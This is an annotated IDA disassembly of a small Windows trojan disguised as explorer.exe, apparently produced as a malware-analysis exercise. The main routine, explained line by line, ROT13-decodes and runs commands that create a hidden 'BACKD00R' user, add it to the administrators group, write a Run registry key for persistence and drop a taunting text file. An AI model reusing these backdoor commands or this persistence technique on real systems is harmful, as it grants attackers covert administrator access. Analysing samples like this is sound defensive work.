

;
; +-------------------------------------------------------------------------+
; |	This file is generated by The Interactive Disassembler (IDA)	    |
; |	Copyright (c) 2007 by DataRescue sa/nv,	<ida@datarescue.com>	    |
; | 									    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	E77AD17C6C596BC0F45FE9BBD92CE2D5

; File Name   :	C:\Documents and Settings\aleks\Desktop\explorer.exe
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00000C74 (   3188.)
; Section size in file		: 00000E00 (   3584.)
; Offset to raw	data for section: 00000400
; Flags	60000060: Text Data Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		.686p
		.mmx
		.model flat
.intel_syntax noprefix

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function static bp-based frame

__gnu_exception_handler@4 proc near	; DATA XREF: ___mingw_CRTStartup+Ao

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp		; save ebp
		mov	ebp, esp	; top of the stack
		sub	esp, 18h	; reserve space	on the stac
		mov	[ebp+var_8], ebx ; store ebx within this space
		mov	edx, [ebp+arg_0] ; edx points to above this space ebp=esp-8
		xor	ebx, ebx	; ebx =	0
		mov	[ebp+var_4], esi ; store esi above ebx
		mov	eax, [edx]	; eax =	edx which points to ebp=esp-8
		xor	esi, esi	; esi=0
		mov	eax, [eax]
		cmp	eax, 0C0000091h	; check	STATUS_FLOAT exceptions
		ja	short exceptionChk1 ; if above (STATUS_FLOAT_OVERFLOW exception) handle	few exceptions
		cmp	eax, 0C000008Dh	; compare eax to STATUS_ARRAY_BOUNDS_EXCEEDED exception
		jb	short statAccesssViolationExc ;	if bellow handle exception

underflowException:			; CODE XREF: __gnu_exception_handler@4+66j
		mov	esi, 1

divByZeroExc:				; CODE XREF: __gnu_exception_handler@4+6Dj
		mov	[esp+18h+var_18], 8 ; esp = 8
		xor	eax, eax	; eax =	0
		mov	[esp+18h+var_14], eax ;	esp+4 =	0
		call	signal		; Signal Floating Point	Error!
		cmp	eax, 1
		jz	short loc_4010AD
		test	eax, eax
		jz	short loc_40106F
		mov	[esp+18h+var_18], 8
		call	eax

loc_40104E:				; CODE XREF: __gnu_exception_handler@4+ABj
					; __gnu_exception_handler@4+C4j
		mov	ebx, 0FFFFFFFFh

loc_401053:				; CODE XREF: __gnu_exception_handler@4+D0j
					; __gnu_exception_handler@4+ECj
		mov	eax, ebx	; eax =0
		mov	esi, [ebp+var_4] ; grab	previously stored esi from the stack
		mov	ebx, [ebp+var_8] ; grab	previously stored ebx from the stack
		mov	esp, ebp	; top of the stack
		pop	ebp		; restore original ebp
		retn	4
; ---------------------------------------------------------------------------

exceptionChk1:				; CODE XREF: __gnu_exception_handler@4+1Cj
		cmp	eax, 0C0000093h	; STATUS_FLOAT_UNDERFLOW exception?
		jz	short underflowException ; if so handle	it
		cmp	eax, 0C0000094h	; STATUS_INTEGER_DIVIDE_BY_ZERO	exception ?
		jz	short divByZeroExc ; if	so jmp to handle it

loc_40106F:				; CODE XREF: __gnu_exception_handler@4+43j
					; __gnu_exception_handler@4+85j ...
		mov	eax, ebx
		mov	esi, [ebp+var_4]
		mov	ebx, [ebp+var_8]
		mov	esp, ebp
		pop	ebp
		retn	4
; ---------------------------------------------------------------------------
		align 10h

statAccesssViolationExc:		; CODE XREF: __gnu_exception_handler@4+23j
		cmp	eax, 0C0000005h	; STATUS_ACCESS_VIOLATION exception?
		jnz	short loc_40106F ; if not return
		mov	[esp+18h+var_18], 0Bh
		xor	esi, esi
		mov	[esp+18h+var_14], esi
		call	signal		; Signal Floating Point	Error!
		cmp	eax, 1
		jz	short loc_4010D2
		test	eax, eax
		jz	short loc_40106F
		mov	[esp+18h+var_18], 0Bh
		call	eax
		jmp	short loc_40104E
; ---------------------------------------------------------------------------

loc_4010AD:				; CODE XREF: __gnu_exception_handler@4+3Fj
		mov	[esp+18h+var_18], 8
		mov	ebx, 1
		mov	[esp+18h+var_14], ebx
		call	signal		; Signal Floating Point	Error!
		test	esi, esi
		jz	short loc_40104E
		call	_fpreset
		mov	ebx, 0FFFFFFFFh
		jmp	short loc_401053
; ---------------------------------------------------------------------------

loc_4010D2:				; CODE XREF: __gnu_exception_handler@4+9Cj
		mov	[esp+18h+var_18], 0Bh
		mov	ecx, 1
		mov	ebx, 0FFFFFFFFh
		mov	[esp+18h+var_14], ecx
		call	signal		; Signal Floating Point	Error!
		jmp	loc_401053
__gnu_exception_handler@4 endp

; ---------------------------------------------------------------------------
		jmp	short ___mingw_CRTStartup
; ---------------------------------------------------------------------------
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function noreturn	bp-based frame

___mingw_CRTStartup proc near		; CODE XREF: .text:004010F1j start+13p ...

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_C		= byte ptr -0Ch
var_8		= dword	ptr -8

		push	ebp		; save ebp
		mov	ebp, esp	; top of the stack
		push	ebx		; save ebx
		sub	esp, 24h	; reserve 24h bytes on the stack
		lea	ebx, [ebp+var_8] ; restoring previous ebx
		mov	[esp+28h+var_28], offset __gnu_exception_handler@4 ; esp points	to exception handler
		call	SetUnhandledExceptionFilter
		sub	esp, 4		; esp points to	esi stored on the stack
		call	_fpreset	; reinitializes	the floating-point math	package	to recover from	floating point error
		mov	[ebp+var_8], 0	; replaec ebx on stack with 0
		mov	eax, offset dword_404000 ; eax points toward the bottom	of code
		lea	edx, [ebp+var_C]
		mov	[esp+28h+var_18], ebx ;	esp-40 = ebx
		mov	ecx, dword_402400 ; FFFFFFFF
		mov	[esp+28h+var_24], eax ;	store the code loation of eax to esp-4C
		mov	[esp+28h+var_20], edx
		mov	[esp+28h+var_1C], ecx
		mov	[esp+28h+var_28], offset dword_404004
		call	__getmainargs	; get arguments	procedure call
		mov	eax, ds:dword_404010
		test	eax, eax	; is eax set?
		jz	short loc_4011B0
		mov	dword_402410, eax
		mov	edx, ds:_iob
		test	edx, edx
		jnz	loc_4011F6

loc_40116B:				; CODE XREF: ___mingw_CRTStartup+111j
		cmp	edx, 0FFFFFFE0h
		jz	short loc_401190
		mov	eax, ds:dword_404010
		mov	[esp+28h+var_24], eax
		mov	ebx, ds:_iob
		mov	ecx, [ebx+30h]
		mov	[esp+28h+var_28], ecx
		call	_setmode
		mov	edx, ds:_iob

loc_401190:				; CODE XREF: ___mingw_CRTStartup+6Ej
		cmp	edx, 0FFFFFFC0h
		jz	short loc_4011B0
		mov	ebx, ds:dword_404010
		mov	[esp+28h+var_24], ebx
		mov	ecx, ds:_iob
		mov	edx, [ecx+50h]
		mov	[esp+28h+var_28], edx
		call	_setmode

loc_4011B0:				; CODE XREF: ___mingw_CRTStartup+56j
					; ___mingw_CRTStartup+93j
		call	__p__fmode
		mov	ebx, dword_402410
		mov	[eax], ebx
		call	__pei386_runtime_relocator
		and	esp, 0FFFFFFF0h
		call	__p__environ
		mov	ecx, [eax]
		mov	[esp+28h+var_20], ecx
		mov	edx, ds:dword_404000
		mov	[esp+28h+var_24], edx
		mov	eax, ds:dword_404004
		mov	[esp+28h+var_28], eax
		call	_main
		mov	ebx, eax
		call	_cexit
		mov	[esp+28h+var_28], ebx
		call	ExitProcess
; ---------------------------------------------------------------------------

loc_4011F6:				; CODE XREF: ___mingw_CRTStartup+65j
		mov	[esp+28h+var_24], eax
		mov	edx, ds:_iob
		mov	eax, [edx+10h]
		mov	[esp+28h+var_28], eax
		call	_setmode
		mov	edx, ds:_iob
		jmp	loc_40116B
___mingw_CRTStartup endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

		public start
start		proc near

var_8		= dword	ptr -8

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[esp+8+var_8], 1
		call	ds:__set_app_type
		call	___mingw_CRTStartup
; ---------------------------------------------------------------------------
		align 10h

_WinMainCRTStartup:
		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[esp+8+var_8], 2
		call	ds:__set_app_type
		call	___mingw_CRTStartup
; ---------------------------------------------------------------------------
		align 10h

; int __cdecl atexit(void (__cdecl *)())
_atexit:				; CODE XREF: ___do_global_ctors+31p
					; ___main+41p
		push	ebp
		mov	ecx, ds:atexit
		mov	ebp, esp
		pop	ebp
		jmp	ecx
start		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

; _onexit_t __cdecl _onexit(_onexit_t)
__onexit	proc near
		push	ebp
		mov	ecx, ds:_onexit
		mov	ebp, esp
		pop	ebp
		jmp	ecx
__onexit	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

___do_sjlj_init	proc near		; CODE XREF: ___sjlj_init_ctor+4j
		push	ebp
		mov	ebp, esp
		pop	ebp
		jmp	___w32_sharedptr_initialize
___do_sjlj_init	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl main(int argc, const char	**argv,	const char *envp)
_main		proc near		; CODE XREF: ___mingw_CRTStartup+E2p

var_448		= dword	ptr -448h
var_444		= dword	ptr -444h
var_440		= dword	ptr -440h
var_43C		= dword	ptr -43Ch
var_438		= dword	ptr -438h
var_434		= dword	ptr -434h
var_41C		= dword	ptr -41Ch
var_414		= dword	ptr -414h
var_410		= dword	ptr -410h
var_40C		= dword	ptr -40Ch
var_408		= byte ptr -408h
var_208		= byte ptr -208h
argc		= dword	ptr  8
argv		= dword	ptr  0Ch
envp		= dword	ptr  10h

		push	ebp		; save ebp
		mov	ebp, esp	; ebp=esp top of the stack
		push	esi		; preserve esi and ebx
		push	ebx
		sub	esp, 440h	; reserve 440h bytes on	the stack
		and	esp, 0FFFFFFF0h	; make sure esp	address	ends with 0
		mov	eax, 0		; eax =	0
		add	eax, 0Fh
		add	eax, 0Fh	; eax =	1Eh
		shr	eax, 4
		shl	eax, 4		; eax =	10h, essentially zerod out lowest 4 bits in eax
		mov	[ebp+var_41C], eax ; store 10h on the stack
		mov	eax, [ebp+var_41C] ; to	call chkstk
		call	___chkstk	; gcc call to check stack
		call	___main
		mov	[esp+448h+var_440], 200h ; setup name buffer 512bytes long character
		lea	eax, [ebp+var_408] ; location of explorer.exe
		mov	[esp+448h+var_444], eax	; esp+4= address ebp+408h where	to store the name of file
		mov	[esp+448h+var_448], 0 ;	of te currently	running	process
		call	GetModuleFileNameA ; get file name explorer.exe
		sub	esp, 0Ch	; pad the stack
		mov	[esp+448h+var_448], offset NCOPYSCNUL ;	COPY \"%S\" \"C:\\\" > NUL
					; make a backup	copy of	explorer.exe to	c:\
		call	ROT13		; decrypt the string above
		mov	edx, eax	; store	decrypted string in edx
		lea	eax, [ebp+var_408] ; location of explorer.exe
		mov	[esp+448h+var_440], eax
		mov	[esp+448h+var_444], edx	; allocate necessary buffers for the function call
		lea	eax, [ebp+var_208]
		mov	[esp+448h+var_448], eax
		call	sprintf		; write	to buffer decrypted string
		lea	eax, [ebp+var_208] ; allocate necessary	buffer for the function	call
		mov	[esp+448h+var_448], eax
		call	system		; system call to execute command above
		mov	[esp+448h+var_448], offset NCHAHAHAHA_TXT ; "C:\\HAHAHAHA.TXT"
		call	ROT13		; decrypt the string above
		mov	[esp+448h+var_444], offset unk_403000 ;	77h
		mov	[esp+448h+var_448], eax
		call	fopen		; file open HAHAHAHA.TXT for write
		mov	[ebp+var_414], eax
		mov	[esp+448h+var_448], offset NYOUVEBEENHACKE ; YOU'VE BEEN HACKED, SUCKA...\N
		call	ROT13		; decrypt the string above
		mov	[esp+448h+var_444], eax
		mov	eax, [ebp+var_414] ; allocate necessary	buffer for the function	call
		mov	[esp+448h+var_448], eax
		call	fprintf		; write	to file	string above
		mov	eax, [ebp+var_414] ; allocate necessary	buffer for the function	call
		mov	[esp+448h+var_448], eax
		call	fclose		; close	file handle
		mov	[esp+448h+var_448], offset NBACKD00R ; "BACKD00R"
		call	ROT13		; decrypt the string above
		mov	esi, eax	; store	decrypted string in esi+0
		mov	[esp+448h+var_448], offset NBACKD00R ; "BACKD00R"
		call	ROT13		; decrypt the string above
		mov	ebx, eax	; store	decrypted string in ebx	- DOS variable S
		mov	[esp+448h+var_448], offset NNETUSERSSADDNU ; "NET USER %S %S /ADD > NUL"
					; essentially created user BACKD00R with pwd BACKD00R
					; > NUL	behind the closed doors
		call	ROT13		; decrypt the string above
		mov	[esp+448h+var_43C], esi
		mov	[esp+448h+var_440], ebx	; allocate necessary buffer for	the function call
		mov	[esp+448h+var_444], eax	; store	decrypted string on the	stack
		lea	eax, [ebp+var_208]
		mov	[esp+448h+var_448], eax
		call	sprintf		; write	to buffer decrypted string
		lea	eax, [ebp+var_208]
		mov	[esp+448h+var_448], eax
		call	system		; system call to execute command above
		mov	[esp+448h+var_448], offset NBACKD00R ; "BACKD00R"
		call	ROT13		; decrypt the string above
		mov	ebx, eax	; store	decrypted string in ebx
		mov	[esp+448h+var_448], offset NNETLOCALGROUPA ; "NET LOCALGROUP ADMINISTRATORS %S /ADD >"...
					; esentially elevevates	privelages of user BACKD00R to
					; administrator	group
		call	ROT13		; decrypt the string above
		mov	[esp+448h+var_440], ebx	; allocate necessary buffer for	the function call
		mov	[esp+448h+var_444], eax	; store	decrypted string on stack
		lea	eax, [ebp+var_208]
		mov	[esp+448h+var_448], eax
		call	sprintf		; write	to buffer decrypted string
		lea	eax, [ebp+var_208]
		mov	[esp+448h+var_448], eax
		call	system		; system call to execute command above
		mov	[esp+448h+var_448], offset NSOFTWAREMICROS ; SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
					; reg location of win startup programs
		call	ROT13		; decrypt the string above
		mov	edx, eax	; store	decrypted string in edx
		lea	eax, [ebp+var_40C]
		mov	[esp+448h+var_438], eax	; handle to the	open key
		mov	[esp+448h+var_43C], 2 ;	allocate necessary buffers for the function call
		mov	[esp+448h+var_440], 0 ;	ulOptions - must be zero
		mov	[esp+448h+var_444], edx	; reg location
		mov	[esp+448h+var_448], 80000002h ;	HKEY_LOCAL_MACHINE
		call	RegOpenKeyExA	; open registry	key to place the null value under location above
		sub	esp, 14h	; pad the stack
		mov	[ebp+var_410], eax
		lea	eax, [ebp+var_408] ; get length	of what	string?	location of explorer.exe
		mov	[esp+448h+var_448], eax
		call	strlen		; get the length of string
		mov	[esp+448h+var_434], eax	; store	string length
		lea	eax, [ebp+var_408] ; data to be	set: explorer.exe
		mov	[esp+448h+var_438], eax	; store	location of explorer.exe
		mov	[esp+448h+var_43C], 1 ;	allocate necessary buffer for the function call
		mov	[esp+448h+var_440], 0 ;	This parameter is reserved and must be zero.
		mov	[esp+448h+var_444], offset aNull ; null	- The name of the value	to be set
		mov	eax, [ebp+var_40C]
		mov	[esp+448h+var_448], eax	; A handle to an open registry key
		call	RegSetValueExA	; set null under  SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
		sub	esp, 18h	; pad the stack
		mov	[ebp+var_410], eax ; function return
		mov	eax, [ebp+var_40C]
		mov	[esp+448h+var_448], eax
		call	RegCloseKey	; close	reg handle
		sub	esp, 4		; pad the stack
		mov	[esp+448h+var_448], offset NCWINNTEXPLORER ; ROT13 C:\\WINNT\\EXPLORER.EXE
					; location of explorer.exe in NT win
		call	ROT13		; decrypt the string above
		mov	[esp+448h+var_444], 0
		mov	[esp+448h+var_448], eax	; store	decrypted string on stack
		call	_execl		; execute explorer under WINNT location
		mov	[esp+448h+var_448], offset NCWINDOWSEXPLOR ; C:\\WINDOWS\\EXPLORER.EXE
					; location of explorer.exe in XP and alike win
		call	ROT13		; decrypt the string above
		mov	[esp+448h+var_444], 0
		mov	[esp+448h+var_448], eax	; store	decrypted string on stack
		call	_execl		; open new process explorer.exe	sitting	at win XP location
		lea	esp, [ebp-8]
		pop	ebx		; return to previous state
		pop	esi
		pop	ebp		; FIN -	THE END
		retn
_main		endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

ROT13		proc near		; CODE XREF: _main+5Dp	_main+95p ...

var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		sub	esp, 14h
		mov	eax, [ebp+arg_0]
		mov	[esp+18h+var_18], eax
		call	strlen
		mov	[ebp+var_C], eax
		mov	eax, [ebp+var_C]
		inc	eax
		mov	[esp+18h+var_18], eax
		call	malloc
		mov	[ebp+var_10], eax
		mov	[ebp+var_8], 0

loc_401501:				; CODE XREF: ROT13+F1j
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_C]
		jg	loc_4015CC
		mov	eax, [ebp+var_10]
		mov	edx, [ebp+var_8]
		add	edx, eax
		mov	eax, [ebp+arg_0]
		add	eax, [ebp+var_8]
		movzx	eax, byte ptr [eax]
		mov	[edx], al
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_8]
		cmp	byte ptr [eax],	40h
		jle	short loc_401572
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_8]
		cmp	byte ptr [eax],	5Ah
		jg	short loc_401572
		mov	eax, [ebp+var_10]
		mov	ebx, [ebp+var_8]
		add	ebx, eax
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_8]
		movsx	eax, byte ptr [eax]
		lea	ecx, [eax-34h]
		mov	eax, 4EC4EC4Fh
		imul	ecx
		sar	edx, 3
		mov	eax, ecx
		sar	eax, 1Fh
		sub	edx, eax
		mov	eax, edx
		add	eax, eax
		add	eax, edx
		shl	eax, 2
		add	eax, edx
		add	eax, eax
		sub	ecx, eax
		mov	eax, ecx
		add	al, 41h
		mov	[ebx], al
		jmp	short loc_4015C2
; ---------------------------------------------------------------------------

loc_401572:				; CODE XREF: ROT13+53j	ROT13+5Ej
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_8]
		cmp	byte ptr [eax],	60h
		jle	short loc_4015C2
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_8]
		cmp	byte ptr [eax],	7Ah
		jg	short loc_4015C2
		mov	eax, [ebp+var_10]
		mov	ebx, [ebp+var_8]
		add	ebx, eax
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_8]
		movsx	eax, byte ptr [eax]
		lea	ecx, [eax-54h]
		mov	eax, 4EC4EC4Fh
		imul	ecx
		sar	edx, 3
		mov	eax, ecx
		sar	eax, 1Fh
		sub	edx, eax
		mov	eax, edx
		add	eax, eax
		add	eax, edx
		shl	eax, 2
		add	eax, edx
		add	eax, eax
		sub	ecx, eax
		mov	eax, ecx
		add	al, 61h
		mov	[ebx], al

loc_4015C2:				; CODE XREF: ROT13+9Aj	ROT13+A5j ...
		lea	eax, [ebp+var_8]
		inc	dword ptr [eax]
		jmp	loc_401501
; ---------------------------------------------------------------------------

loc_4015CC:				; CODE XREF: ROT13+31j
		mov	eax, [ebp+var_10]
		add	esp, 14h
		pop	ebx
		pop	ebp
		retn
ROT13		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

__pei386_runtime_relocator proc	near	; CODE XREF: ___mingw_CRTStartup+BDp
		push	ebp
		mov	ecx, offset unk_4030F0
		mov	ebp, esp
		jmp	short loc_4015FE
; ---------------------------------------------------------------------------
		align 10h

loc_4015F0:				; CODE XREF: __pei386_runtime_relocator+24j
		mov	edx, [ecx+4]
		mov	eax, [ecx]
		add	ecx, 8
		add	[edx+400000h], eax

loc_4015FE:				; CODE XREF: __pei386_runtime_relocator+8j
		cmp	ecx, offset unk_4030F0
		jb	short loc_4015F0
		pop	ebp
		retn
__pei386_runtime_relocator endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

; void __cdecl fpreset()
_fpreset	proc near		; CODE XREF: __gnu_exception_handler@4+C6p
					; ___mingw_CRTStartup+19p
		push	ebp
		mov	ebp, esp
		fninit
		pop	ebp
		retn
_fpreset	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

___do_global_dtors proc	near		; DATA XREF: ___do_global_ctors:loc_40168Ao
					; ___main:loc_4016FAo
		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	eax, off_402420
		mov	ecx, [eax]
		test	ecx, ecx
		jz	short locret_401657
		jmp	short loc_401640
; ---------------------------------------------------------------------------
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop

loc_401640:				; CODE XREF: ___do_global_dtors+11j
					; ___do_global_dtors+35j
		call	dword ptr [eax]
		mov	ecx, off_402420
		mov	edx, [ecx+4]
		lea	eax, [ecx+4]
		mov	off_402420, eax
		test	edx, edx
		jnz	short loc_401640

locret_401657:				; CODE XREF: ___do_global_dtors+Fj
		leave
		retn
___do_global_dtors endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

___do_global_ctors proc	near

var_8		= dword	ptr -8

		push	ebp
		mov	ebp, esp
		push	ebx
		sub	esp, 4
		mov	eax, ds:dword_401C60
		cmp	eax, 0FFFFFFFFh
		jz	short loc_40169A

loc_401671:				; CODE XREF: ___do_global_ctors+52j
		test	eax, eax
		mov	ebx, eax
		jz	short loc_40168A
		mov	esi, esi
		lea	edi, [edi+0]

loc_401680:				; CODE XREF: ___do_global_ctors+28j
		call	ds:dword_401C60[ebx*4]
		dec	ebx
		jnz	short loc_401680

loc_40168A:				; CODE XREF: ___do_global_ctors+15j
		mov	[esp+8+var_8], offset ___do_global_dtors
		call	_atexit
		pop	ebx
		pop	ebx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_40169A:				; CODE XREF: ___do_global_ctors+Fj
		mov	ecx, ds:off_401C64
		xor	eax, eax
		test	ecx, ecx
		jmp	short loc_4016B0
; ---------------------------------------------------------------------------

loc_4016A6:				; CODE XREF: ___do_global_ctors:loc_4016B0j
		inc	eax
		mov	edx, ds:off_401C64[eax*4]
		test	edx, edx

loc_4016B0:				; CODE XREF: ___do_global_ctors+44j
		jnz	short loc_4016A6
		jmp	short loc_401671
___do_global_ctors endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

___main		proc near		; CODE XREF: _main+30p

var_8		= dword	ptr -8

		push	ebp		; save base point
		mov	ebp, esp	; we are at top	of the stack
		push	ebx		; save ebx
		sub	esp, 4		; reserve 4bytes on stack
		mov	eax, dword ptr ds:word_404020 ;	eax points to bottom of	the code pointed by ds:...
		test	eax, eax	; if eax set jmp to
		jnz	short loc_401706
		mov	eax, ds:dword_401C60
		mov	ebx, 1		; ebx =	1
		mov	dword ptr ds:word_404020, ebx
		cmp	eax, 0FFFFFFFFh	; if eax != FFFFFFFF jmp
		jz	short loc_40170A

loc_4016E5:				; CODE XREF: ___main+62j
		test	eax, eax	; is eax set?
		mov	ebx, eax	; ebx =	eax
		jz	short loc_4016FA ; if eax set jump
		nop
		lea	esi, [esi+0]	; if not procede

loc_4016F0:				; CODE XREF: ___main+38j
		call	ds:dword_401C60[ebx*4]
		dec	ebx
		jnz	short loc_4016F0

loc_4016FA:				; CODE XREF: ___main+29j
		mov	[esp+8+var_8], offset ___do_global_dtors ; point esp to	global descriptors
		call	_atexit

loc_401706:				; CODE XREF: ___main+Ej
		pop	ebx		; ebx =	poped ebx
		pop	ebx		; ebx =	poped ebp
		pop	ebp		; ebp =	poped ebx
		retn
; ---------------------------------------------------------------------------

loc_40170A:				; CODE XREF: ___main+23j
		mov	ecx, ds:off_401C64
		xor	eax, eax	; eax =0
		test	ecx, ecx	; is ecx set? if so jmp
		jmp	short loc_401720
; ---------------------------------------------------------------------------

search:					; CODE XREF: ___main:loc_401720j
		inc	eax		; eax =	1
		mov	edx, ds:off_401C64[eax*4]
		test	edx, edx	; is edx set, if not search again

loc_401720:				; CODE XREF: ___main+54j
		jnz	short search
		jmp	short loc_4016E5 ; when	found jump
___main		endp

; ---------------------------------------------------------------------------
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function static bp-based frame

___w32_sharedptr_default_unexpected proc near ;	DATA XREF: ___w32_sharedptr_initialize+F3o
		push	ebp
		mov	eax, ds:dword_404070
		mov	ebp, esp
		pop	ebp
		mov	ecx, [eax+4]
		jmp	ecx
___w32_sharedptr_default_unexpected endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function static bp-based frame

___w32_sharedptr_get proc near		; CODE XREF: ___w32_sharedptr_initialize:loc_4019DCp
					; ___w32_sharedptr_initialize+223p

var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= byte ptr -58h
var_4		= dword	ptr -4

		push	ebp
		mov	edx, 42h
		mov	ebp, esp
		push	ebx
		movzx	eax, ax
		sub	esp, 64h
		mov	[esp+68h+var_60], edx
		lea	edx, [ebp+var_58]
		xor	ebx, ebx
		mov	[esp+68h+var_64], edx
		mov	[esp+68h+var_68], eax
		call	ds:GetAtomNameA
		mov	edx, 1Fh
		mov	ecx, 1
		sub	esp, 0Ch
		test	eax, eax
		jnz	short loc_40177D
		jmp	short loc_4017BE
; ---------------------------------------------------------------------------

loc_401778:				; CODE XREF: ___w32_sharedptr_get+42j
		add	ecx, ecx
		dec	edx
		js	short loc_40178B

loc_40177D:				; CODE XREF: ___w32_sharedptr_get+34j
					; ___w32_sharedptr_get+49j
		cmp	byte ptr [edx+ebp-58h],	41h
		jnz	short loc_401778
		or	ebx, ecx
		add	ecx, ecx
		dec	edx
		jns	short loc_40177D

loc_40178B:				; CODE XREF: ___w32_sharedptr_get+3Bj
		cmp	dword ptr [ebx], 3Ch
		jnz	short loc_401797
		mov	eax, ebx
		mov	ebx, [ebp+var_4]
		leave
		retn
; ---------------------------------------------------------------------------

loc_401797:				; CODE XREF: ___w32_sharedptr_get+4Ej
		mov	ecx, offset aW32_sharedptrS ; "w32_sharedptr->size == sizeof(W32_EH_SH"...
		mov	edx, 0EAh
		mov	[esp+68h+var_5C], ecx
		mov	[esp+68h+var_60], edx

loc_4017A9:				; CODE XREF: ___w32_sharedptr_get+90j
		mov	[esp+68h+var_68], offset aSUFailedAssert ; "%s:%u: failed assertion `%s'\n"
		mov	eax, offset a____GccGccConf ; "../../gcc/gcc/config/i386/w32-shared-pt"...
		mov	[esp+68h+var_64], eax
		call	___eprintf
; ---------------------------------------------------------------------------

loc_4017BE:				; CODE XREF: ___w32_sharedptr_get+36j
		mov	eax, offset aGetatomnameaAt ; "GetAtomNameA (atom, s, sizeof(s)) != 0"
		mov	ebx, 0E4h
		mov	[esp+68h+var_5C], eax
		mov	[esp+68h+var_60], ebx
		jmp	short loc_4017A9
___w32_sharedptr_get endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function bp-based	frame

___w32_sharedptr_initialize proc near	; CODE XREF: ___do_sjlj_init+4j

var_D8		= dword	ptr -0D8h
var_BC		= dword	ptr -0BCh
var_B8		= byte ptr -0B8h
var_98		= dword	ptr -98h
var_94		= dword	ptr -94h
var_90		= dword	ptr -90h
var_8C		= dword	ptr -8Ch
var_88		= dword	ptr -88h
var_84		= dword	ptr -84h
var_80		= dword	ptr -80h
var_7C		= dword	ptr -7Ch
var_78		= word ptr -78h
var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= word ptr -28h

		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		push	ebx
		sub	esp, 0CCh
		mov	ecx, ds:dword_404070
		test	ecx, ecx
		jz	short loc_4017FE
		lea	esp, [ebp-0Ch]
		pop	ebx
		pop	esi
		pop	edi
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4017FE:				; CODE XREF: ___w32_sharedptr_initialize+14j
		mov	[ebp+var_68], 41414141h
		mov	eax, ds:dword_403010
		lea	esi, [ebp+var_68]
		mov	[ebp+var_64], 41414141h
		mov	[ebp+var_60], 41414141h
		mov	[ebp+var_48], eax
		mov	eax, ds:dword_403014
		mov	[ebp+var_5C], 41414141h
		mov	[ebp+var_58], 41414141h
		mov	[ebp+var_44], eax
		mov	eax, ds:dword_403018
		mov	[ebp+var_54], 41414141h
		mov	[ebp+var_50], 41414141h
		mov	[ebp+var_40], eax
		mov	eax, ds:dword_40301C
		mov	[ebp+var_4C], 41414141h
		mov	[ebp+var_3C], eax
		mov	eax, ds:dword_403020
		mov	[ebp+var_38], eax
		mov	eax, ds:dword_403024
